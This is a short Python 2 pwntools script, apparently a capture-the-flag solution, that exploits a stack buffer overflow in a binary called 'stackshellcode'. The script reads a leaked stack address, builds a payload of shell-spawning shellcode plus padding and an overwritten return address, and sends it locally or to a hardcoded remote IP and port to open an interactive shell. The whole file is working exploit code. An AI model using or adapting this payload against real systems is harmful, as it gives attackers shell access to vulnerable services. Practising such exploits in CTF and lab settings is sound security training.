#!/usr/bin/env python2
from pwn import *
import sys
#context.log_level = 'error'
context.arch = 'amd64'
# context.terminal = ['zsh', '-e', 'sh', '-c']
HOST = '128.199.104.41'
PORT = 20950
BINARY = './stackshellcode'


def exploit(p, local=True):

    shellcode = asm(shellcraft.sh())
    bufsize = 408
    # nops = '\x90'*32
    padding = "A"*(bufsize-len(shellcode))
    a = p.recv().strip().split(' ')
    buf = int(a[6], 16)
    print hex(buf)
    payload = ''
    payload += shellcode + padding + p64(buf)
    print len(payload)
    p.sendline(payload)
    p.interactive()

    #actual_address = base + offset
    #offset = konstan
    #base = konstan per runtime
    #0x00007ffff7de0340 -> actual_address = base + offset

if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r, False)
    else:
        # local
        p = process(BINARY)
        exploit(p)
